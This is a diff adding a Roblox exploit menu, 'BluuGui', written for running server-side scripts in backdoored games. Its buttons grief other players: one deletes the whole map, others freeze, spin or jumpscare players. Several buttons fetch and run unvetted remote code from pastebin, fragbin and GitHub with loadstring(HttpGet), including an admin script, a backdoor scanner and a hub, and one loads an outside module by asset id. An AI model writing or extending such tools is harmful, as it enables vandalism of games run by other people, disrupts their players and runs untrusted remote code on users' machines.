@@ -1,0 +1,439 @@
+local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+
+local Window = Rayfield:CreateWindow({
+   Name = "BluuGui Server side scripts",
+   Icon = 0, -- Icon in Topbar. Can use Lucide Icons (string) or Roblox Image (number). 0 to use no icon (default).
+   LoadingTitle = "Use on backdoored games!",
+   LoadingSubtitle = "by 118o8",
+   ShowText = "BluuGui (Only FE)", -- for mobile users to unhide rayfield, change if you'd like
+   Theme = "Ocean", -- Check https://docs.sirius.menu/rayfield/configuration/themes
+
+   ToggleUIKeybind = "B", -- The keybind to toggle the UI visibility (string like "K" or Enum.KeyCode)
+
+   DisableRayfieldPrompts = false,
+   DisableBuildWarnings = false, -- Prevents Rayfield from warning when the script has a version mismatch with the interface
+
+   ConfigurationSaving = {
+      Enabled = true,
+      FolderName = nil, -- Create a custom folder for your hub/game
+      FileName = "Big Hub"
+   },
+
+   Discord = {
+      Enabled = false, -- Prompt the user to join your Discord server if their executor supports it
+      Invite = "noinvitelink", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ ABCD would be ABCD
+      RememberJoins = true -- Set this to false to make them join the discord every time they load it up
+   },
+
+   KeySystem = false, -- Set this to true to use our key system
+   KeySettings = {
+      Title = "Untitled",
+      Subtitle = "Key System",
+      Note = "No method of obtaining the key is provided", -- Use this to tell the user how to get a key
+      FileName = "Key", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
+      SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script
+      GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
+      Key = {"Hello"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
+   }
+})
+
+Rayfield:Notify({
+   Title = "BluuGui executed!",
+   Content = "Enjoy making chaos >:D",
+   Duration = 3.5,
+   Image = 4483362458,
+})
+
+local Server = Window:CreateTab("Server Manegament", 4483362458) -- Title, Image
+
+local Section = Server:CreateSection("Bluudud favorites")
+
+local Button = Server:CreateButton({
+   Name = "BluuWord",
+   Callback = function()
+  local Lighting = game:GetService("Lighting")
+
+-- Function to check if a part should be colored
+local function isMapPart(part)
+    return part:IsA("BasePart") and part.Anchored
+end
+
+-- Function to set a part to blue scale
+local function setBlueScale(part)
+    local original = part.Color
+    local brightness = (original.r + original.g + original.b)/3
+    part.Color = Color3.new(0, 0, brightness)
+end
+
+-- Function to color all parts in the workspace
+local function colorMapBlue()
+    for _, obj in pairs(workspace:GetDescendants()) do
+        if isMapPart(obj) then
+            setBlueScale(obj)
+        end
+    end
+end
+
+-- Function to change the sky
+local function setBlueSky()
+    if Lighting:FindFirstChildOfClass("Sky") then
+        Lighting:FindFirstChildOfClass("Sky"):Destroy()
+    end
+
+    local sky = Instance.new("Sky")
+    sky.Name = "BlueSky"
+
+    -- Replace these with your blue-themed asset IDs
+    sky.SkyboxBk = "rbxassetid://1234567890"
+    sky.SkyboxDn = "rbxassetid://1234567891"
+    sky.SkyboxFt = "rbxassetid://1234567892"
+    sky.SkyboxLf = "rbxassetid://1234567893"
+    sky.SkyboxRt = "rbxassetid://1234567894"
+    sky.SkyboxUp = "rbxassetid://1234567895"
+
+    sky.Parent = Lighting
+end
+
+-- Execute immediately
+colorMapBlue()
+setBlueSky()
+
+   end,
+})
+
+local Button = Server:CreateButton({
+   Name = "Bluu Party!",
+   Callback = function()
+   local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+-- Replace this with the Animation ID for "Monster Smash Go"
+local animationId = "rbxassetid://YOUR_ANIMATION_ID"
+
+-- Function to play animation on a character
+local function playDance(character)
+    local humanoid = character:FindFirstChildOfClass("Humanoid")
+    if humanoid then
+        -- Create the animation
+        local danceAnim = Instance.new("Animation")
+        danceAnim.AnimationId = animationId
+
+        -- Load and play
+        local track = humanoid:LoadAnimation(danceAnim)
+        track.Priority = Enum.AnimationPriority.Action
+        track:Play()
+    end
+end
+
+-- Play for all existing players
+for _, player in pairs(Players:GetPlayers()) do
+    if player.Character then
+        playDance(player.Character)
+    end
+end
+
+-- Play for new players when they join
+Players.PlayerAdded:Connect(function(player)
+    player.CharacterAdded:Connect(function(character)
+        -- Small delay to ensure Humanoid exists
+        wait(1)
+        playDance(character)
+    end)
+end)
+
+-- Optional: repeat for existing characters respawning
+for _, player in pairs(Players:GetPlayers()) do
+    player.CharacterAdded:Connect(function(character)
+        wait(1)
+        playDance(character)
+    end)
+end
+
+   end,
+})
+
+local Button = Server:CreateButton({
+   Name = "Jump Scare (Very scary)",
+   Callback = function()
+   -- Jump Scare Luau
+
+local player = game.Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- Crear el ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "JumpScareGui"
+screenGui.Parent = playerGui
+
+-- Crear la imagen
+local imageLabel = Instance.new("ImageLabel")
+imageLabel.Size = UDim2.new(1,0,1,0)
+imageLabel.Position = UDim2.new(0,0,0,0)
+imageLabel.Image = "rbxassetid://134659166665541" -- ID de la imagen
+imageLabel.BackgroundTransparency = 1
+imageLabel.Visible = false
+imageLabel.Parent = screenGui
+
+-- Crear el sonido
+local sound = Instance.new("Sound")
+sound.SoundId = "rbxassetid://134659166665541" -- ID del sonido
+sound.Parent = imageLabel
+
+-- Función para mostrar el jump scare
+local function mostrarJumpScare()
+    imageLabel.Visible = true
+    sound:Play()
+    wait(3) -- Espera 3 segundos
+    imageLabel.Visible = false
+end
+
+-- Activar el jump scare al cargar
+wait(2) -- Espera 2 segundos antes de mostrar
+mostrarJumpScare()
+
+   end,
+})   
+
+local Button = Server:CreateButton({
+   Name = "Play music!",
+   Callback = function()
+   local SoundService = game:GetService("SoundService")
+
+-- Create the sound
+local music = Instance.new("Sound")
+music.SoundId = "rbxassetid://114852233968189" -- Replace with your music asset
+music.Volume = 1
+music.Looped = true -- Set to false if you want it to play once
+music.Playing = true
+music.Parent = SoundService
+
+-- Optional: adjust other properties
+music.MaxDistance = 1000
+music.EmitterSize = 50
+
+   end,
+})
+
+local desc = Server:CreateSection("Server Destruction >:D")
+
+local Button = Server:CreateButton({
+   Name = "Nuke map",
+   Callback = function()
+   local Workspace = game:GetService("Workspace")
+
+-- List of objects we don't want to delete
+local protectedObjects = {
+    "Terrain", 
+    "Camera"
+}
+
+-- Function to check if an object is protected
+local function isProtected(obj)
+    for _, name in pairs(protectedObjects) do
+        if obj.Name == name then
+            return true
+        end
+    end
+    return false
+end
+
+-- Delete all other objects
+for _, obj in pairs(Workspace:GetChildren()) do
+    if not isProtected(obj) then
+        obj:Destroy()
+    end
+end
+
+   end,
+})
+
+local Button = Server:CreateButton({
+   Name = "Server admin",
+   Callback = function()
+            
+loadstring(game:HttpGet("https://pastebin.com/raw/xuy7gHRj"))()
+   
+        end,
+})
+
+local Button = Server:CreateButton({
+   Name = "Stop time",
+   Callback = function()
+   local Players = game:GetService("Players")
+local Lighting = game:GetService("Lighting")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Workspace = game:GetService("Workspace")
+
+-- >>> SETTINGS <<<
+local executorUserName = "YourUserNameHere" -- Replace with the username of the player who can move
+local freezeDuration = 10 -- seconds
+local clockModelName = "ClockModel" -- a clock model stored in ReplicatedStorage
+
+-- >>> FREEZE PLAYERS <<<
+local function freezePlayer(player)
+	if player.Character then
+		local hum = player.Character:FindFirstChildOfClass("Humanoid")
+		if hum then
+			hum.WalkSpeed = 0
+			hum.JumpHeight = 0
+			hum.PlatformStand = true
+		end
+	end
+end
+
+local function unfreezePlayer(player)
+	if player.Character then
+		local hum = player.Character:FindFirstChildOfClass("Humanoid")
+		if hum then
+			hum.WalkSpeed = 16
+			hum.JumpHeight = 7.2
+			hum.PlatformStand = false
+		end
+	end
+end
+
+-- >>> SET MAP GREY <<<
+local originalAmbient = Lighting.Ambient
+local originalOutdoorAmbient = Lighting.OutdoorAmbient
+
+local function setMapGrey()
+	Lighting.Ambient = Color3.fromRGB(169, 169, 169)
+	Lighting.OutdoorAmbient = Color3.fromRGB(169, 169, 169)
+end
+
+local function resetMapColor()
+	Lighting.Ambient = originalAmbient
+	Lighting.OutdoorAmbient = originalOutdoorAmbient
+end
+
+-- >>> CLOCK EFFECT <<<
+local function spawnClock()
+	local clockTemplate = ReplicatedStorage:FindFirstChild(clockModelName)
+	if clockTemplate then
+		local clock = clockTemplate:Clone()
+		clock.Parent = Workspace
+		clock:SetPrimaryPartCFrame(CFrame.new(0, 10, 0)) -- position it above the map
+		game.Debris:AddItem(clock, freezeDuration) -- automatically remove after freezeDuration
+	end
+end
+
+-- >>> MAIN EVENT <<<
+spawnClock()        -- spawn the clock model
+setMapGrey()        -- make map grey
+
+for _, player in pairs(Players:GetPlayers()) do
+	if player.Name ~= executorUserName then
+		freezePlayer(player)
+	end
+end
+
+task.wait(freezeDuration)
+
+resetMapColor()
+
+for _, player in pairs(Players:GetPlayers()) do
+	if player.Name ~= executorUserName then
+		unfreezePlayer(player)
+	end
+end
+
+   end,
+})
+
+local Button = Server:CreateButton({
+   Name = "Spin all",
+   Callback = function()
+   local Players = game:GetService("Players")
+local SpinDuration = 5       -- how long to spin (seconds)
+local SpinSpeed = 10         -- degrees per frame
+
+local function spinCharacter(character)
+    local rootPart = character:FindFirstChild("HumanoidRootPart")
+    if rootPart then
+        -- Create a BodyAngularVelocity to spin
+        local bav = Instance.new("BodyAngularVelocity")
+        bav.AngularVelocity = Vector3.new(0, math.rad(SpinSpeed), 0)
+        bav.MaxTorque = Vector3.new(0, math.huge, 0)
+        bav.P = 1250
+        bav.Parent = rootPart
+
+        -- Remove after SpinDuration
+        game.Debris:AddItem(bav, SpinDuration)
+    end
+end
+
+local function spinAllPlayers()
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player.Character then
+            spinCharacter(player.Character)
+        end
+    end
+end
+
+-- Spin all now
+spinAllPlayers()
+
+-- Also spin players who respawn during spin time
+Players.PlayerAdded:Connect(function(player)
+    player.CharacterAdded:Connect(function(char)
+        spinCharacter(char)
+    end)
+end)
+
+   end,
+})
+
+local Section = Server:CreateSection("Backdoors scaners")
+
+local Button = Server:CreateButton({
+   Name = "LALOL",
+   Callback = function()
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/its-LALOL/LALOL-Hub/main/Backdoor-Scanner/script"))()
+
+            Rayfield:Notify({
+   Title = "LALOL scaner executed",
+   Content = "Good Luck :3",
+   Duration = 2.3,
+   Image = 4483362458,
+})
+   end,
+})
+
+local Button = Server:CreateButton({
+   Name = "Polaria Hub (Basic)",
+   Callback = function()
+  
+loadstring(game:HttpGet("https://www.fragbin.com/api/pastes/raw/4VAIWK"))()
+
+            Rayfield:Notify({
+   Title = "Polaria Hub executed",
+   Content = "Lets make some Chaos >:D",
+   Duration = 2.3,
+   Image = 4483362458,
+})
+   end,
+})
+
+local Button = Server:CreateButton({
+   Name = "Polaria Hub",
+   Callback = function()
+  
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+-- Automatically get your DisplayName
+local myDisplayName = player.DisplayName
+
+-- Require the module and pass the DisplayName
+local myModule = require(123255432303221)
+myModule:Pload(myDisplayName)
+
+
+            Rayfield:Notify({
+   Title = "Polaria Hub executed",
+   Content = "Remember use LAOLOL after execute cuz u can get banned :P",
+   Duration = 5.0,
+   Image = 4483362458,
+})
+   end,
+})
